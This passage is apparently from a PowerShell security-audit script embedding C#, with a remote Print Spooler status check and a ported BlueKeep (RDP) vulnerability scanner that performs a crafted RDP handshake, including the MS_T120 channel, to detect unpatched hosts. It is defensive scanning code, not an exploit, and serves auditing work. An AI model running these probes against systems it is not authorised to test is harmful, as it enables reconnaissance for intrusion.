        [SecurityPermission(SecurityAction.LinkDemand, Flags = SecurityPermissionFlag.UnmanagedCode)]
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {

            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
        
        public bool CheckIfTheSpoolerIsActive(string computer)
		{
			IntPtr hHandle = IntPtr.Zero;

			DEVMODE_CONTAINER devmodeContainer = new DEVMODE_CONTAINER();
			try
			{
				Int32 ret = RpcOpenPrinter("\\\\" + computer, out hHandle, null, ref devmodeContainer, 0);
				if (ret == 0)
				{
					return true;
				}
			}
			finally
			{
				if (hHandle != IntPtr.Zero)
					RpcClosePrinter(ref hHandle);
			}
			return false;
		}
    }

}
"@
	Add-Type -TypeDefinition $sourceSpooler
	$rprn = New-Object PingCastle.ExtractedCode.rprn
	$list = New-Object System.Collections.ArrayList
	$ComputerName | foreach {
		$data = New-Object  PSObject -Property @{
			"ComputerName" = $_
			"Status"       = $rprn.CheckIfTheSpoolerIsActive($_)
		}
		$list.add($data) | Out-Null
	}
	return $list
}
function Get-BlueKeepStatus{
	<#
	https://github.com/vletoux/Bluekeep-scanner/blob/master/bluekeep.ps1

	.EXAMPLE
	PS > Get-BlueKeepStatus -ComputerName localhost
	#>
	Param(
        [parameter(Mandatory=$true,ValueFromPipeline=$true,ValueFromPipelineByPropertyName=$true)]
        [string[]]$ComputerName
	)
	$source = @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace PingCastle
{
	public class bluekeeptest
	{
		
		static public bool ScanForBlueKeep(string computer)
		{
			Trace.WriteLine("Checking " + computer + " for bluekeep");
			TcpClient client = new TcpClient();
			try
			{
				client.Connect(computer, 3389);
				
				
			}
			catch (Exception)
			{
				throw new Exception("RDP port closed " + computer);
			}
			try
			{
				NetworkStream stream = client.GetStream();

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/18a27ef9-6f9a-4501-b000-94b1fe3c2c10
				Console.WriteLine("-> Client X.224 Connection Request PDU");
				SendPacket(x224ConnectionRequest("elton"), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/13757f8f-66db-4273-9d2c-385c33b1e483
				byte[] inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server X.224 Connection Confirm PDU");

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/db6713ee-1c0e-4064-a3b3-0fac30b4037b
				Console.WriteLine("-> Client MCS Connect Initial PDU with GCC Conference Create Request");
				SendPacket(ConnectInitial("eltons-dev"), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/927de44c-7fe8-4206-a14f-e5517dc24b1c
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Connect Response PDU with GCC Conference Create Response");
				
				byte[] rsmod;
				byte[] rsexp;
				byte[] server_random;
				int bitlen;
				ParseServerData(inbuffer, out rsmod, out rsexp, out server_random, out bitlen);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/04c60697-0d9a-4afd-a0cd-2cc133151a9c
				Console.WriteLine("-> Client MCS Erect Domain Request PDU");
				SendPacket(new byte[] { 0x02, 0xf0, 0x80, 0x04, 0x00, 0x01, 0x00, 0x01 }, stream);
				
				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/f5d6a541-9b36-4100-b78f-18710f39f247
				Console.WriteLine("-> Client MCS Attach User Request PDU");
				SendPacket(new byte[] { 0x02, 0xf0, 0x80, 0x28 }, stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/3b3d850b-99b1-4a9a-852b-1eb2da5024e5
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Attach User Confirm PDU (len=" + inbuffer.Length + ")");

				int user1= inbuffer[5] + inbuffer[6];
				
				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/64564639-3b2d-4d2c-ae77-1105b4cc011b
				byte[] pdu_channel_request = new byte[] {0x02,0xf0,0x80,0x38, 0, 0, 3, 0};
				pdu_channel_request[pdu_channel_request.Length - 3] = (byte)user1;

				Console.WriteLine("-> Client MCS Channel Join Request PDU");
				pdu_channel_request[pdu_channel_request.Length - 1] = (byte)0xF1;
				SendPacket(pdu_channel_request, stream);

				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Channel Join Confirm PDU Received (len=" + inbuffer.Length + ")");

				Console.WriteLine("-> Client MCS Channel Join Request PDU");
				pdu_channel_request[pdu_channel_request.Length - 1] = (byte)0xEB;
				SendPacket(pdu_channel_request, stream); 

				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Channel Join Confirm PDU Received (len=" + inbuffer.Length + ")");

				Console.WriteLine("-> Client MCS Channel Join Request PDU");
				pdu_channel_request[pdu_channel_request.Length - 1] = (byte)0xEC;
				SendPacket(pdu_channel_request, stream); 

				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Channel Join Confirm PDU Received (len=" + inbuffer.Length + ")");

				Console.WriteLine("-> Client MCS Channel Join Request PDU");
				pdu_channel_request[pdu_channel_request.Length - 1] = (byte)0xED;
				SendPacket(pdu_channel_request, stream);

				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Channel Join Confirm PDU Received (len=" + inbuffer.Length + ")");

				Console.WriteLine("-> Client MCS Channel Join Request PDU");
				pdu_channel_request[pdu_channel_request.Length - 1] = (byte)0xEF;
				SendPacket(pdu_channel_request, stream);

				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Channel Join Confirm PDU Received (len=" + inbuffer.Length + ")");

				Console.WriteLine("-> Client MCS Channel Join Request PDU");
				pdu_channel_request[pdu_channel_request.Length - 1] = (byte)0xF0;
				SendPacket(pdu_channel_request, stream);

				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server MCS Channel Join Confirm PDU Received (len=" + inbuffer.Length + ")");

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/9cde84cd-5055-475a-ac8b-704db419b66f
				Console.WriteLine("-> Client Security Exchange PDU");

				byte[] clientrand = new byte[32] {
												0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
												0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
												0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 
												0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
				};

				SendPacket(SecuritExchange(clientrand, rsexp, rsmod, bitlen), stream);
				
				byte[] clientEncryptKey, clientDecryptKey, macKey, sessionKeyBlob;
				ComputeRC4Keys(clientrand, server_random, out clientEncryptKey, out clientDecryptKey, out macKey, out sessionKeyBlob);

				RDP_RC4 encrypt = new RDP_RC4(clientEncryptKey);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/772d618e-b7d6-4cd0-b735-fa08af558f9d
				Console.WriteLine("-> Client Info PDU");
				SendPacket(EncryptPkt(ConvertHexStringToByteArray(GetClientInfo()), encrypt, macKey, 0x48), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/7d941d0d-d482-41c5-b728-538faa3efb31
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server License Error PDU - Valid Client (len=" + inbuffer.Length + ")");

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/a07abad1-38bb-4a1a-96c9-253e3d5440df
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Demand Active PDU (len=" + inbuffer.Length + ")");

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/4c3c2710-0bf0-4c54-8e69-aff40ffcde66
				Console.WriteLine("-> Client Confirm Active PDU");
				SendPacket(EncryptPkt(ConvertHexStringToByteArray(ConfirmActive()), encrypt, macKey, 0x38), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/e0027486-f99a-4f0f-991c-eda3963521c2
				Console.WriteLine("-> client synchronize PDU");
				SendPacket(EncryptPkt(ConvertHexStringToByteArray("16001700f103ea030100000108001f0000000100ea03"), encrypt, macKey), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/9d1e1e21-d8b4-4bfd-9caf-4b72ee91a713
				Console.WriteLine("-> client control cooperate PDU");
				SendPacket(EncryptPkt(ConvertHexStringToByteArray("1a001700f103ea03010000010c00140000000400000000000000"), encrypt, macKey), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/4f94e123-970b-4242-8cf6-39820d8e3d35
				Console.WriteLine("-> client control request control PDU");
				SendPacket(EncryptPkt(ConvertHexStringToByteArray("1a001700f103ea03010000010c00140000000100000000000000"), encrypt, macKey), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/2d122191-af10-4e36-a781-381e91c182b7
				Console.WriteLine("-> client persistent key list PDU");
				SendPacket(EncryptPkt(ConvertHexStringToByteArray(ClientPersistentKeyList()), encrypt, macKey, 0x38), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/7067da0d-e318-4464-88e8-b11509cf0bd9
				Console.WriteLine("-> client font list PDU");
				SendPacket(EncryptPkt(ConvertHexStringToByteArray("1a001700f103ea03010000010c00270000000000000003003200"), encrypt, macKey), stream);

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/5186005a-36f5-4f5d-8c06-968f28e2d992
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server Synchronize PDU (len=" + inbuffer.Length + ")");

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/43296a04-6324-4cbf-93d1-8e056e969082
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server Control PDU - Cooperate (len=" + inbuffer.Length + ")");

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ff7bae0e-cd13-4776-83b2-ef1f45e1fc41
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server Control PDU - Granted Control (len=" + inbuffer.Length + ")");

				// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/7ba6ba81-e4f4-46a7-9062-2d57a821be26
				inbuffer = ReadTPKT(stream);
				Console.WriteLine("<- Server Font Map PDU (len=" + inbuffer.Length + ")");

				Console.WriteLine("clear buffer");
				byte[] temp = ReadAllAvailableData(stream);

				byte[] disconnect = new byte[] { 0x03, 0x00, 0x00, 0x09, 0x02, 0xf0, 0x80, 0x21, 0x80 };

				for (int k = 0; k < 4; k++)
				{
					SendPacket(EncryptPkt(ConvertHexStringToByteArray("100000000300000000000000020000000000000000000000"), encrypt, macKey, 8, 0x3ed), stream);

					SendPacket(EncryptPkt(ConvertHexStringToByteArray("20000000030000000000000000000000020000000000000000000000000000000000000000000000"), encrypt, macKey, 8, 0x3ed), stream);
					inbuffer = ReadAllAvailableData(stream);
					if (inbuffer.Length >= disconnect.Length)
					{
						bool match = true;
						for (int j = 0; j < inbuffer.Length; j++)
						{
							if (inbuffer[inbuffer.Length - disconnect.Length + j] != disconnect[j])
							{
								match = false;
								break;
							}
						}
						if (match)
						{
							Console.WriteLine("disconnect found - machine is vulnerable");
							return true;
						}
					}
				}
			}
			catch (Exception)
			{
				throw;
			}
			return false;
		}

		// T.123 - 8. Packet header to delimit data units in an octet stream
		private static byte[] ReadTPKT(Stream stream)
		{
			byte[] inbuffer = new byte[65535];
			if (!stream.CanRead)
			{
				throw new InvalidOperationException("no read");
			}
			int bytesRead = stream.Read(inbuffer, 0, 4);
			if (bytesRead != 4)
			{
				throw new InvalidOperationException("incomplete packet");
			}
			if (inbuffer[0] != 3)
			{
				throw new InvalidOperationException("invalid signature");
			}
			if (inbuffer[1] != 0)
			{
				throw new InvalidOperationException("invalid reserved byte");
			}
			int lenght = inbuffer[2] * 0x100 + inbuffer[3] - 4;
			bytesRead = stream.Read(inbuffer, 0, lenght);
			if (bytesRead < lenght)
			{
				throw new InvalidOperationException("data too short");
			}
			byte[] output = new byte[lenght];
			Array.Copy(inbuffer, output, lenght);
			return output;
		}

		static byte[] ReadAllAvailableData(Stream stream)
		{
			byte[] inbuffer = new byte[65535];
			if (!stream.CanRead)
			{
				throw new InvalidOperationException("no read");
			}
			int lenght = stream.Read(inbuffer, 0, inbuffer.Length);
			byte[] output = new byte[lenght];
			Array.Copy(inbuffer, output, lenght);
			return output;
		}

		private static void SendPacket(byte[] data, Stream stream)
		{
			byte[] output = new byte[data.Length + 4];
			output[0] = 3;
			output[1] = 0;
			output[2] = (byte) ((data.Length + 4) / 0x100);
			output[3] = (byte) ((data.Length + 4) % 0x100);
			Array.Copy(data, 0, output, 4, data.Length);
			stream.Write(output, 0, output.Length);
			stream.Flush();
		}

		private static string GetClientInfo()
		{
			string data = "000000003301000000000a000000000000000000";
			data+="75007300650072003000"; // FIXME: username
			data+="000000000000000002001c00";
			data+="3100390032002e003100360038002e0031002e00320030003800"; // FIXME: ip
			data+="00003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000";
			return data;
		}

		private static string ConfirmActive()
		{
			string data = "a4011300f103ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00100001000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000";
			return data;
		}


		private static string ClientPersistentKeyList()
		{
			string data = "49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
			return data;
		}

		private static byte[] ConvertHexStringToByteArray(string data)
		{
			int length = (data.Length) / 2;
			byte[] arr1 = new byte[length];
			for (int i = 0; i < length; i++)
				arr1[i] = Convert.ToByte(data.Substring(2 * i, 2), 16);
			return arr1;
		}

		// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/18a27ef9-6f9a-4501-b000-94b1fe3c2c10
		private static byte[] x224ConnectionRequest(string username)
		{
			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);
			byte[] b = Encoding.UTF8.GetBytes(username);
			byte[] part1 = new byte[] {
				(byte) (33+b.Length), // X.224: Length indicator
				0xe0,                                  // X.224: Type - TPDU
				0x00,0x00,                              // X.224: Destination reference
				0x00,0x00,                              // X.224: Source reference
				0x00,                                  // X.224: Class and options
				0x43,0x6f,0x6f,0x6b,0x69,0x65,0x3a,0x20,0x6d,0x73,0x74,0x73,0x68,0x61,0x73,0x68,0x3d, // "Cookie: mstshash=
			};
			byte[] part2 = new byte[] {
				0x0d,0x0a,                              // Cookie terminator sequence
				0x01,                                  // Type: RDP_NEG_REQ)
				0x00,                                 // RDP_NEG_REQ::flags 
				0x08,0x00,                             // RDP_NEG_REQ::length (8 bytes)
				0x00,0x00,0x00,0x00,                    // Requested protocols (PROTOCOL_RDP)
				};
			
			ms.Write(part1, 0, part1.Length);
			ms.Write(b, 0, b.Length);
			ms.Write(part2, 0, part2.Length);
			ms.Seek(0, SeekOrigin.Begin);
			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);
			return output;
		}


		// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/db6713ee-1c0e-4064-a3b3-0fac30b4037b
		private static byte[] ConnectInitial(string hostname)
		{
			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);
			byte[] b = Encoding.Unicode.GetBytes(hostname);
			byte[] part1 = new byte[] {
				0x02,0xf0,0x80,             // x.224
				0x7f,0x65,0x82,0x01,0xbe, // change here
				0x04,0x01,0x01,0x04,
				0x01,0x01,0x01,0x01,0xff,
				0x30,0x20,0x02,0x02,0x00,0x22,0x02,0x02,0x00,0x02,0x02,0x02,0x00,0x00,0x02,0x02,0x00,0x01,0x02,0x02,0x00,0x00,0x02,0x02,0x00,0x01,0x02,0x02,0xff,0xff,0x02,0x02,0x00,0x02,0x30,0x20,
				0x02,0x02,0x00,0x01,0x02,0x02,0x00,0x01,0x02,0x02,0x00,0x01,0x02,0x02,0x00,0x01,0x02,0x02,0x00,0x00,0x02,0x02,0x00,0x01,0x02,0x02,0x04,0x20,0x02,0x02,0x00,0x02,0x30,0x20,0x02,0x02,
				0xff,0xff,0x02,0x02,0xfc,0x17,0x02,0x02,0xff,0xff,0x02,0x02,0x00,0x01,0x02,0x02,0x00,0x00,0x02,0x02,0x00,0x01,0x02,0x02,0xff,0xff,0x02,0x02,0x00,0x02,0x04,0x82,0x01,0x4b, // chnage here
				0x00,0x05,0x00,0x14,0x7c,0x00,0x01,0x81,0x42, // change here - ConnectPDU
				0x00,0x08,0x00,0x10,0x00,0x01,0xc0,0x00,0x44,0x75,0x63,0x61,0x81,0x34, // chnage here 
				0x01,0xc0,0xd8,0x00,0x04,0x00,0x08,0x00,0x20,0x03,0x58,0x02,0x01,0xca,0x03,0xaa,0x09,0x04,0x00,0x00,0x28,0x0a,0x00,0x00
			};
			ms.Write(part1, 0, part1.Length);

			ms.Write(b, 0, b.Length);
			for (int i = 0; i < 32 - b.Length; i++)
			{
				ms.WriteByte(0);
			}

			byte[] part2 = new byte[] {
				0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0xca,0x01,0x00,0x00,0x00,0x00,0x00,0x18,0x00,0x07,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0xc0,0x0c,0x00,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0xc0,0x0c,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
				0x03,0xc0,
				0x44,0x00,
				0x04,0x00,0x00,0x00, //channel count
				0x63,0x6c,0x69,0x70,0x72,0x64,0x72,0x00,0xc0,0xa0,0x00,0x00, //cliprdr
				0x4d,0x53,0x5f,0x54,0x31,0x32,0x30,0x00,0x00,0x00,0x00,0x00, //MS_T120
				0x72,0x64,0x70,0x73,0x6e,0x64,0x00,0x00,0xc0,0x00,0x00,0x00, //rdpsnd
				0x73,0x6e,0x64,0x64,0x62,0x67,0x00,0x00,0xc0,0x00,0x00,0x00, //snddbg
				0x72,0x64,0x70,0x64,0x72,0x00,0x00,0x00,0x80,0x80,0x00,0x00, //rdpdr
			};

			ms.Write(part2, 0, part2.Length);
			ms.Seek(0, SeekOrigin.Begin);
			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);
			return output;
		}

		// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/927de44c-7fe8-4206-a14f-e5517dc24b1c
		private static void ParseServerData(byte[] inbuffer, out byte[] rsmod, out byte[] rsexp, out byte[] server_random,out int bitlen)
		{
			int ptr = 0x45;
			while (ptr < inbuffer.Length)
			{
				int headerType = BitConverter.ToInt16(inbuffer, ptr);
				int headerSize = BitConverter.ToInt16(inbuffer, ptr +2);
				Console.WriteLine("- Header: {0}  Len: {1}", headerType, headerSize);
				if (headerType == 0xC02)
				{
					// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/3e86b68d-3e2e-4433-b486-878875778f4b
					Console.WriteLine("- Security Header");
					int magic = BitConverter.ToInt32(inbuffer, ptr + 68);
					if (magic == 0x31415352)
					{
						bitlen = BitConverter.ToInt32(inbuffer, ptr + 72) - 8;
						server_random = new byte[32];
						Array.Copy(inbuffer, ptr + 20, server_random, 0, 32);
						rsexp = new byte[4];
						Array.Copy(inbuffer, ptr + 84, rsexp, 0, 4);
						rsmod = new byte[bitlen];
						Array.Copy(inbuffer, ptr + 88, rsmod, 0, bitlen);
						return;
					}
				}
				ptr += headerSize;
			}
			throw new NotImplementedException();
		}

		static byte[] reserveBytes(byte[] input)
		{
			byte[] output = new byte[input.Length];
			for (int i = 0; i < input.Length; i++)
			{
				output[input.Length - 1 - i] = input[i];
			}
			return output;
		}

		static byte[] SecuritExchange(byte[] rcran, byte[] rsexp, byte[] rsmod, int bitlen)
		{
			MemoryStream ms = new MemoryStream();
			BinaryReader reader = new BinaryReader(ms);

			RSAParameters rsaparameters = new RSAParameters();
			rsaparameters.Exponent = reserveBytes(rsexp);
			rsaparameters.Modulus = reserveBytes(rsmod);
			RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
			rsa.ImportParameters(rsaparameters);
            
			byte[] encryptedSecret = reserveBytes(rsa.Encrypt(rcran, false));

			byte[] part2 = new byte[] {
				0x02,0xf0,0x80, //  X.224
				0x64, // sendDataRequest
				0x00,0x08, // intiator userId
				0x03,0xeb, //channelId = 1003
				0x70, // dataPriority
			};
			ms.Write(part2, 0, part2.Length);
			// FIX ME - hardcoded
			ms.WriteByte(0x81);
			ms.WriteByte(0x10);
			//ms.Write(BitConverter.GetBytes((short)(bitlen + 8)), 0, 2);
    
			// 2.2.1.10.1 Security Exchange PDU Data (TS_SECURITY_PACKET)
			// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/ca73831d-3661-4700-9357-8f247640c02e
			byte[] part3 = new byte[] {
				0x01,0x00,
				0x00, 0x00
			}; // SEC_EXCHANGE_PKT
			ms.Write(part3, 0, part3.Length);
			ms.Write(BitConverter.GetBytes((uint)bitlen + 8), 0, 4); // securityPkt length
			ms.Write(encryptedSecret, 0, encryptedSecret.Length); // 64 bytes encrypted client random
			ms.Write(new byte[8] , 0, 8); //8 bytes rear padding (always present)

			ms.Seek(0, SeekOrigin.Begin);
			byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);
			return output;
		}

		// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/705f9542-b0e3-48be-b9a5-cf2ee582607f
		private static void ComputeRC4Keys(byte[] clientrand, byte[] server_random, out byte[] clientEncryptKey, out byte[] clientDecryptKey, out byte[] macKey, out byte[] sessionKey)
		{
			// pre master key
			byte[] preMasterKey = new byte[48];
			Array.Copy(clientrand, preMasterKey, 24);
			Array.Copy(server_random, 0, preMasterKey, 24, 24);

			// master key
			byte[] m1 = SaltedHash(preMasterKey, new byte[] { 0x41 }, clientrand, server_random);
			byte[] m2 = SaltedHash(preMasterKey, new byte[] { 0x42, 0x42 }, clientrand, server_random);
			byte[] m3 = SaltedHash(preMasterKey, new byte[] { 0x43, 0x43, 0x43 }, clientrand, server_random);

			byte[] masterKey = new byte[m1.Length + m2.Length + m3.Length];
			Array.Copy(m1, 0, masterKey, 0, m1.Length);
			Array.Copy(m2, 0, masterKey, m1.Length, m2.Length);
			Array.Copy(m3, 0, masterKey, m1.Length + m2.Length, m3.Length);

			// session key
			byte[] s1 = SaltedHash(masterKey, new byte[] { 0x58 }, clientrand, server_random);
			byte[] s2 = SaltedHash(masterKey, new byte[] { 0x59, 0x59 }, clientrand, server_random);
			byte[] s3 = SaltedHash(masterKey, new byte[] { 0x5A, 0x5A, 0x5A }, clientrand, server_random);

			sessionKey = new byte[s1.Length + s2.Length + s3.Length];
			Array.Copy(s1, 0, sessionKey, 0, s1.Length);
			Array.Copy(s2, 0, sessionKey, s1.Length, s2.Length);
			Array.Copy(s3, 0, sessionKey, s1.Length + s2.Length, s3.Length);

			// keys
			clientDecryptKey = FinalHash(s2, clientrand, server_random);
			clientEncryptKey = FinalHash(s3, clientrand, server_random);
			macKey = s1;
		}

		// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/705f9542-b0e3-48be-b9a5-cf2ee582607f
		static byte[] SaltedHash(byte[] s, byte[] i, byte[] clientRand, byte[] serverRand)
		{
			using (SHA1 sha1 = SHA1.Create())
			using (MD5 md5 = MD5.Create())
			{
				sha1.TransformBlock(i, 0, i.Length, i, 0);
				sha1.TransformBlock(s, 0, s.Length, s, 0);
				sha1.TransformBlock(clientRand, 0, clientRand.Length, clientRand, 0);
				sha1.TransformFinalBlock(serverRand, 0, serverRand.Length);
				md5.TransformBlock(s, 0, s.Length, s, 0);
				md5.TransformFinalBlock(sha1.Hash, 0, sha1.Hash.Length);
				return md5.Hash;
			}
		}

		// https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/705f9542-b0e3-48be-b9a5-cf2ee582607f
		static byte[] FinalHash(byte[] k, byte[] clientRand, byte[] serverRand)
		{
			using (MD5 md5 = MD5.Create())
			{
				md5.TransformBlock(k, 0, k.Length, k, 0);
				md5.TransformBlock(clientRand, 0, clientRand.Length, clientRand, 0);
